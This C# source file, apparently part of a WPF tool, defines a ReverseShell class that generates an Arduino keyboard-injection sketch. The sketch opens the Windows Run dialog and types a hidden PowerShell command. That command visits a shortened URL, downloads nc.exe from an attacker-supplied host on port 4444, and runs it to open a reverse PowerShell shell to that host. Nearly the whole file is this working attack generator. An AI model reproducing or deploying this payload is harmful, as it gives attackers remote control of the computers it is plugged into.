using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp2.Classes
{
    internal class ReverseShell
    {
        public string Path = "test";
        private string lport { get; set; }
        private string lhost { get; set; }
        public ReverseShell(string LHOST, string LPORT)
        {
            lport = LPORT;
            lhost = LHOST;
        }

        public string ReverseShellSketch()
        {
            try
            {
                if (!Directory.Exists(Path))
                {
                    Directory.CreateDirectory(Path);
                }

                string sketch = "" +
                    "#include <Keyboard.h>\r\n\r\n" +
                    "#define URI \"http://10.4.72.218\"\r\n\r\n" +
                    "void setup()" +
                    "{\r\n" +
                    $"  String command=R\"(powershell -WindowStyle Hidden Start-Process \"https://shorturl.at/l6fy5\"; cd $env:tmp; iwr http://{lhost}:4444/nc.exe -OutFile nc.exe; .\\nc.exe {lhost} {lport} -e powershell)\";\r\n" +
                    "   delay (1000);\r\n\r\n" +
                    "   Keyboard.press(KEY_LEFT_GUI);\r\n" +
                    "   Keyboard.press('r');\r\n" +
                    "   Keyboard.releaseAll();\r\n\r\n" +
                    "   delay (1000);\r\n\r\n" +
                    "   Keyboard.println (command);\r\n" +
                    "   delay (100);\r\n" +
                    "   Keyboard.end();\r\n}\r\n\r\n" +
                    "void loop(){\r\n  // put your main code here, to run repeatedly:\r\n\r\n}\r\n";

                File.WriteAllText(@"test\test.ino", sketch);
                return "Done Doubtfully 😎";
            }
            catch (Exception ex)
            {
                return $"Failed Successfully 😁: {ex}";
            }
        }
    }
}
